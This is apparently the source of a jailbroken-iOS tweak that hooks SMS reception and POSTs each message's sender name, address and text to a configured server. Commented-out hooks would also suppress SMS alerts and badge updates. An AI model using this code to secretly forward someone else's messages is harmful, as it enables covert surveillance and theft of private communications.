#import <ChatKit/ChatKit.h>
#import <SpringBoard/SpringBoard.h>
#import <CoreTelephony/CTMessageCenter.h>


// Settings
NSString* port = @"8888";
NSString* host = @"http://192.168.1.100";

/*
%hook SBAwayModel

// Prevent popups for SMS in lockscreen
- (void)addSMSMessage:(id)message
{
  return;
}

%end


%hook SBAlertItemsController

// Prevent popups for SMS
- (void)activateAlertItem:(id)item
{
  if ( [item isKindOfClass:%c(SBSMSAlertItem)] )
    return;

  %orig;
}

%end
*/

%hook SBSMSManager

- (void)messageReceived:(id)received
{
  NSDictionary* userInfo = [received valueForKey:@"userInfo"];
  CKSMSMessage* sms = [userInfo valueForKey:@"CKMessageKey"];
  CKSMSEntity* sender = [sms sender];

  // Prevent increment of badge count
  //[self markMessageAsRead:sms];

  // POST to REST Server
  NSMutableString* parameters = [NSMutableString string];
  [parameters appendFormat:@"name=%@", [sender name]];
  [parameters appendFormat:@"&address=%@", [sender rawAddress]];
  [parameters appendFormat:@"&message=%@", [sms text]];

  NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"%@:%@%@", host, port, @"/sms"]];
  NSMutableURLRequest* request = [NSMutableURLRequest requestWithURL:url];
  [request setHTTPMethod:@"POST"];
  [request setHTTPBody:[parameters dataUsingEncoding:NSUTF8StringEncoding]];
  [NSURLConnection connectionWithRequest:request delegate:nil];

  %orig;
}

%end